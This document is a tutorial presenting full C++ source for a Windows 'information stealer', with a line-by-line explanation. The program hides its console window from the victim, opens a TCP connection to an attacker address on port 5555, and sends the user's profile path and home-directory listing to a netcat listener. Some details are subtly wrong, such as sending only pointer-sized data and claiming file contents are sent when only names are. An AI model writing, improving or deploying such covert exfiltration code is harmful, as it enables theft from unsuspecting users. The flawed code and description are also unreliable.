# C++ Information Stealer

### Code

```cpp
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>


char* userDirectory() {
    char* pPath;
    pPath = getenv("USERPROFILE");

    if (pPath!=NULL) {
        return pPath;
    }
    else {
        perror("");
    }
}


int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_addr.s_addr = inet_addr("10.10.15.2");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);

    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    char* pPath = userDirectory();
    send(server, pPath, sizeof(pPath), 0);
    send(server, "\n", 1, 0);

    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(pPath)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            send(server, ent->d_name, sizeof(ent->d_name), 0);
            send(server, "\n", 1, 0);
            memset(ent->d_name, 0, sizeof(ent->d_name));
        }
        closedir(dir);
    }
    else {
        perror("");
    }

    closesocket(server);
    WSACleanup();
}
```



### Compilation

* Add the flag **-lws2\_32** for the linker



### Description

The above code would read the contents of the files in the home directory of the victim user and send it over to the attacker machine by establishing a TCP connection over port 5555.

On the attacker's end, we will be using netcat to setup a listener on port 5555 and receive the data sent by the stealer program.

Now that's a high level overview of the code. Let's dive deeper into the code and understand the parts of it:



### Explanation

#### Snippet 1:

```cpp
#define _WINSOCK_DEPRECATED_NO_WARNINGS
```

Explanation: We use winsock utilities and we do not want the compiler to complain about older functionalities used, since the below code is sufficient for our needs.

#### Snippet 2:

```cpp
#pragma comment(lib, "Ws2_32.lib")
```

Explanation: We need the Ws2\_32.lib library in order to use sockets (networking) functionality in Windows.

#### Snippet 3:

```cpp
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>
```

Explanation: Here we have included some header files. These are:

* **iostream:** includes standard input/output utilities
* **winsock2.h:** includes networking utilities
* **stdio.h:** includes standard input/output utilities (needed for perror())
* **stdlib.h:** includes standard input/output utilities
* **dirent.h:** includes directory utilities
* **string:** includes string utilities

#### Snippet 4:

```cpp
char* userDirectory() {
    char* pPath;
    pPath = getenv("USERPROFILE");

    if (pPath!=NULL) {
        return pPath;
    }
    else {
        perror("");
    }
}
```

Explanation: This function gets the value of %USERPROFILE% environment variable.

Information: The %USERPROFILE% variable contains the path of the user profile folder we have access to (a.k.a. the victim user).

And that's the reason we have set the name of this function as userDirectory, since it returns the path of the user's directory with which this program would be running as!

#### Snippet 5:

```cpp
ShowWindow(GetConsoleWindow(), SW_HIDE);
```

Explanation: To hide the program window so that it's not obvious to the victim that this program is running!

#### Snippet 6:

```cpp
WSADATA WSAData;
SOCKET server;
SOCKADDR_IN addr;
```

Explanation: The above code snippet declares 3 variables of different types:

* **WSADATA:** This data type (it's a struct) holds information about windows socket implementation.
* **SOCKET:** This data type stores the connection of the SOCKET type.
* **SOCKADDR\_IN:** This data type (it's a struct) holds the details of socket connection. This must make clear what the purpose of the variables mentioned in the above snippet would be.

#### Snippet 7:

```cpp
WSAStartup(MAKEWORD(2, 0), &WSAData);
```

Explanation: Initialize usage of the winsock library (needed for opening a network connection).

#### Snippet 8:

```cpp
server = socket(AF_INET, SOCK_STREAM, 0);
```

Explanation: Set up a TCP socket. AF\_INET means address family for IPv4. SOCK\_STREAM means that we want a TCP socket.

#### Snippet 9:

```cpp
addr.sin_addr.s_addr = inet_addr("10.10.15.2");
addr.sin_family = AF_INET;
addr.sin_port = htons(5555);
```

Explanation: The above snippet would set the IP address of the target we wish to sent the data to (that would be the attacker's IP address). The port used would be 5555 and the IP address is IPv4 which is indicated by AF\_INET.

#### Snippet 10:

```cpp
connect(server, (SOCKADDR *)&addr, sizeof(addr));
```

Explanation: Connect to the previously set up target host/port.

#### Snippet 11:

```cpp
char* pPath = userDirectory();
```

Explanation: Get the user directory using the userDirectory function.

#### Snippet 12:

```cpp
send(server, pPath, sizeof(pPath), 0);
send(server, "\n", 1, 0);
```

Explanation: Send the user directory path to the attacker. This is followed by a newline so that the output received by the attacker is properly formatted - 1 entry per line.

#### Snippet 13:

```cpp
DIR *dir;
struct dirent *ent;

if ((dir = opendir(pPath)) != NULL) {
    while ((ent = readdir(dir)) != NULL) {
        send(server, ent->d_name, sizeof(ent->d_name), 0);
        send(server, "\n", 1, 0);
        memset(ent->d_name, 0, sizeof(ent->d_name));
    }
    closedir(dir);
}
else {
    perror("");
}
```

Explanation: The above snippet opens the user's directory and then reads the entries in it. All the entries are then sent back to the attacker's machine over the established TCP socket. A newline is also sent, so that the directory listing is displayed with one entry per line. In case the directory cannot be opened, the program will display the associated error using the call to perror().

There is also a call to `memset` in the `while` loop. That is used to zero out the directory name. The reason is because if you don't do that, the output you get from this program would contain the directory names containing the left overs from the previous directories as well.

#### Snippet 14:

```cpp
closesocket(server);
```

Explanation: Close the socket.

#### Snippet 15:

```cpp
WSACleanup();
```

Explanation: Clean up the Winsock library components.

